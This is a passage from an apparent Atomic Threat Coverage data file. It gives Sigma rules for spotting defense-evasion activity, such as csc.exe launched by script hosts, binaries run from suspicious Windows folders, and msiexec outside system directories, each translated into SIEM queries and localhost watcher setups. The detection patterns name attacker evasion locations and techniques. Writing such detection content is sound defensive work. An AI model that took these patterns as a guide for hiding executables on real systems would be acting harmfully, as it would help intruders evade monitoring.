\"(Image.keyword:*\\\\\\\\\\\\\\\\csc.exe* AND ParentImage.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\mshta.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Parent of Csc.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\csc.exe* AND ParentImage.keyword:(*\\\\\\\\wscript.exe *\\\\\\\\cscript.exe *\\\\\\\\mshta.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\csc.exe*\" (ParentImage=\"*\\\\\\\\wscript.exe\" OR ParentImage=\"*\\\\\\\\cscript.exe\" OR ParentImage=\"*\\\\\\\\mshta.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\csc.exe*\" ParentImage IN [\"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\mshta.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\csc\\\\.exe.*)(?=.*(?:.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\mshta\\\\.exe)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Executables Started in Suspicious Folder\nid: 7a38aa19-86a9-4af7-ac51-6bfe4e59f254\nstatus: experimental\ndescription: Detects process starts of binaries from a suspicious folder\nauthor: Florian Roth\ndate: 2017/10/14\nmodified: 2019/02/21\nreferences:\n    - https://github.com/mbevilacqua/appcompatprocessor/blob/master/AppCompatSearch.txt\n    - https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\n    - https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/\n    - https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/suspicious_process_creation_via_windows_event_logs.md\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - C:\\PerfLogs\\\\*\n            - C:\\$Recycle.bin\\\\*\n            - C:\\Intel\\Logs\\\\*\n            - C:\\Users\\Default\\\\*\n            - C:\\Users\\Public\\\\*\n            - C:\\Users\\NetworkService\\\\*\n            - C:\\Windows\\Fonts\\\\*\n            - C:\\Windows\\Debug\\\\*\n            - C:\\Windows\\Media\\\\*\n            - C:\\Windows\\Help\\\\*\n            - C:\\Windows\\addins\\\\*\n            - C:\\Windows\\repair\\\\*\n            - C:\\Windows\\security\\\\*\n            - '*\\RSA\\MachineKeys\\\\*'\n            - C:\\Windows\\system32\\config\\systemprofile\\\\*\n            - C:\\Windows\\Tasks\\\\*\n            - C:\\Windows\\System32\\Tasks\\\\*\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Executables Started in Suspicious Folder\nid: 7a38aa19-86a9-4af7-ac51-6bfe4e59f254\nstatus: experimental\ndescription: Detects process starts of binaries from a suspicious folder\nauthor: Florian Roth\ndate: 2017/10/14\nmodified: 2019/02/21\nreferences:\n    - https://github.com/mbevilacqua/appcompatprocessor/blob/master/AppCompatSearch.txt\n    - https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\n    - https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/\n    - https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/suspicious_process_creation_via_windows_event_logs.md\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - C:\\PerfLogs\\\\*\n            - C:\\$Recycle.bin\\\\*\n            - C:\\Intel\\Logs\\\\*\n            - C:\\Users\\Default\\\\*\n            - C:\\Users\\Public\\\\*\n            - C:\\Users\\NetworkService\\\\*\n            - C:\\Windows\\Fonts\\\\*\n            - C:\\Windows\\Debug\\\\*\n            - C:\\Windows\\Media\\\\*\n            - C:\\Windows\\Help\\\\*\n            - C:\\Windows\\addins\\\\*\n            - C:\\Windows\\repair\\\\*\n            - C:\\Windows\\security\\\\*\n            - '*\\RSA\\MachineKeys\\\\*'\n            - C:\\Windows\\system32\\config\\systemprofile\\\\*\n            - C:\\Windows\\Tasks\\\\*\n            - C:\\Windows\\System32\\Tasks\\\\*\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:(C\\\\:\\\\\\\\PerfLogs\\\\\\\\* OR C\\\\:\\\\\\\\$Recycle.bin\\\\\\\\* OR C\\\\:\\\\\\\\Intel\\\\\\\\Logs\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\NetworkService\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Debug\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Media\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Help\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\repair\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\security\\\\\\\\* OR *\\\\\\\\RSA\\\\\\\\MachineKeys\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\Tasks\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Executables-Started-in-Suspicious-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Executables Started in Suspicious Folder\",\\n    \"description\": \"Detects process starts of binaries from a suspicious folder\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\PerfLogs\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\$Recycle.bin\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Intel\\\\\\\\\\\\\\\\Logs\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\NetworkService\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Debug\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Media\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Help\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\security\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\RSA\\\\\\\\\\\\\\\\MachineKeys\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\systemprofile\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Tasks\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\Tasks\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\PerfLogs\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\$Recycle.bin\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Intel\\\\\\\\\\\\\\\\Logs\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\NetworkService\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Debug\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Media\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Help\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\repair\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\security\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\RSA\\\\\\\\\\\\\\\\MachineKeys\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\systemprofile\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Tasks\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\Tasks\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Executables Started in Suspicious Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:(C\\\\:\\\\\\\\PerfLogs\\\\\\\\* C\\\\:\\\\\\\\$Recycle.bin\\\\\\\\* C\\\\:\\\\\\\\Intel\\\\\\\\Logs\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\NetworkService\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Debug\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Media\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Help\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\repair\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\security\\\\\\\\* *\\\\\\\\RSA\\\\\\\\MachineKeys\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\Tasks\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"C:\\\\\\\\PerfLogs\\\\\\\\*\" OR Image=\"C:\\\\\\\\$Recycle.bin\\\\\\\\*\" OR Image=\"C:\\\\\\\\Intel\\\\\\\\Logs\\\\\\\\*\" OR Image=\"C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\" OR Image=\"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR Image=\"C:\\\\\\\\Users\\\\\\\\NetworkService\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Debug\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Media\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Help\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\repair\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\security\\\\\\\\*\" OR Image=\"*\\\\\\\\RSA\\\\\\\\MachineKeys\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\Tasks\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"C:\\\\\\\\PerfLogs\\\\\\\\*\", \"C:\\\\\\\\$Recycle.bin\\\\\\\\*\", \"C:\\\\\\\\Intel\\\\\\\\Logs\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\NetworkService\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Debug\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Media\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Help\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\repair\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\security\\\\\\\\*\", \"*\\\\\\\\RSA\\\\\\\\MachineKeys\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\Tasks\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*C:\\\\PerfLogs\\\\\\\\.*|.*C:\\\\\\\\$Recycle\\\\.bin\\\\\\\\.*|.*C:\\\\Intel\\\\Logs\\\\\\\\.*|.*C:\\\\Users\\\\Default\\\\\\\\.*|.*C:\\\\Users\\\\Public\\\\\\\\.*|.*C:\\\\Users\\\\NetworkService\\\\\\\\.*|.*C:\\\\Windows\\\\Fonts\\\\\\\\.*|.*C:\\\\Windows\\\\Debug\\\\\\\\.*|.*C:\\\\Windows\\\\Media\\\\\\\\.*|.*C:\\\\Windows\\\\Help\\\\\\\\.*|.*C:\\\\Windows\\\\addins\\\\\\\\.*|.*C:\\\\Windows\\\\repair\\\\\\\\.*|.*C:\\\\Windows\\\\security\\\\\\\\.*|.*.*\\\\RSA\\\\MachineKeys\\\\\\\\.*|.*C:\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\\\\\.*|.*C:\\\\Windows\\\\Tasks\\\\\\\\.*|.*C:\\\\Windows\\\\System32\\\\Tasks\\\\\\\\.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Execution in Non-Executable Folder\nid: 3dfd06d2-eaf4-4532-9555-68aca59f57c4\nstatus: experimental\ndescription: Detects a suspicious exection from an uncommon folder\nauthor: Florian Roth\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\$Recycle.bin'\n            - '*\\Users\\All Users\\\\*'\n            - '*\\Users\\Default\\\\*'\n            - '*\\Users\\Public\\\\*'\n            - 'C:\\Perflogs\\\\*'\n            - '*\\config\\systemprofile\\\\*'\n            - '*\\Windows\\Fonts\\\\*'\n            - '*\\Windows\\IME\\\\*'\n            - '*\\Windows\\addins\\\\*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Execution in Non-Executable Folder\nid: 3dfd06d2-eaf4-4532-9555-68aca59f57c4\nstatus: experimental\ndescription: Detects a suspicious exection from an uncommon folder\nauthor: Florian Roth\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\$Recycle.bin'\n            - '*\\Users\\All Users\\\\*'\n            - '*\\Users\\Default\\\\*'\n            - '*\\Users\\Public\\\\*'\n            - 'C:\\Perflogs\\\\*'\n            - '*\\config\\systemprofile\\\\*'\n            - '*\\Windows\\Fonts\\\\*'\n            - '*\\Windows\\IME\\\\*'\n            - '*\\Windows\\addins\\\\*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:(*\\\\\\\\$Recycle.bin OR *\\\\\\\\Users\\\\\\\\All\\\\ Users\\\\\\\\* OR *\\\\\\\\Users\\\\\\\\Default\\\\\\\\* OR *\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR C\\\\:\\\\\\\\Perflogs\\\\\\\\* OR *\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\IME\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Execution-in-Non-Executable-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Execution in Non-Executable Folder\",\\n    \"description\": \"Detects a suspicious exection from an uncommon folder\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"Image.keyword:(*\\\\\\\\\\\\\\\\$Recycle.bin OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\All\\\\\\\\ Users\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Perflogs\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\systemprofile\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\IME\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:(*\\\\\\\\\\\\\\\\$Recycle.bin OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\All\\\\\\\\ Users\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Perflogs\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\systemprofile\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\IME\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Execution in Non-Executable Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:(*\\\\\\\\$Recycle.bin *\\\\\\\\Users\\\\\\\\All Users\\\\\\\\* *\\\\\\\\Users\\\\\\\\Default\\\\\\\\* *\\\\\\\\Users\\\\\\\\Public\\\\\\\\* C\\\\:\\\\\\\\Perflogs\\\\\\\\* *\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\* *\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* *\\\\\\\\Windows\\\\\\\\IME\\\\\\\\* *\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\$Recycle.bin\" OR Image=\"*\\\\\\\\Users\\\\\\\\All Users\\\\\\\\*\" OR Image=\"*\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\" OR Image=\"*\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR Image=\"C:\\\\\\\\Perflogs\\\\\\\\*\" OR Image=\"*\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\IME\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\$Recycle.bin\", \"*\\\\\\\\Users\\\\\\\\All Users\\\\\\\\*\", \"*\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\", \"*\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"C:\\\\\\\\Perflogs\\\\\\\\*\", \"*\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\IME\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\\\\\$Recycle\\\\.bin|.*.*\\\\Users\\\\All Users\\\\\\\\.*|.*.*\\\\Users\\\\Default\\\\\\\\.*|.*.*\\\\Users\\\\Public\\\\\\\\.*|.*C:\\\\Perflogs\\\\\\\\.*|.*.*\\\\config\\\\systemprofile\\\\\\\\.*|.*.*\\\\Windows\\\\Fonts\\\\\\\\.*|.*.*\\\\Windows\\\\IME\\\\\\\\.*|.*.*\\\\Windows\\\\addins\\\\\\\\.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious MsiExec Directory\nid: e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144\nstatus: experimental\ndescription: Detects suspicious msiexec process starts in an uncommon directory\nreferences:\n    - https://twitter.com/200_okay_/status/1194765831911215104\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2019/11/14\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\msiexec.exe'\n    filter:\n        Image: \n            - 'C:\\Windows\\System32\\\\*'\n            - 'C:\\Windows\\SysWOW64\\\\*'\n            - 'C:\\Windows\\WinSxS\\\\*' \n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious MsiExec Directory\nid: e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144\nstatus: experimental\ndescription: Detects suspicious msiexec process starts in an uncommon directory\nreferences:\n    - https://twitter.com/200_okay_/status/1194765831911215104\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2019/11/14\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\msiexec.exe'\n    filter:\n        Image: \n            - 'C:\\Windows\\System32\\\\*'\n            - 'C:\\Windows\\SysWOW64\\\\*'\n            - 'C:\\Windows\\WinSxS\\\\*' \n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\msiexec.exe AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-MsiExec-Directory <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious MsiExec Directory\",\\n    \"description\": \"Detects suspicious msiexec process starts in an uncommon directory\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": 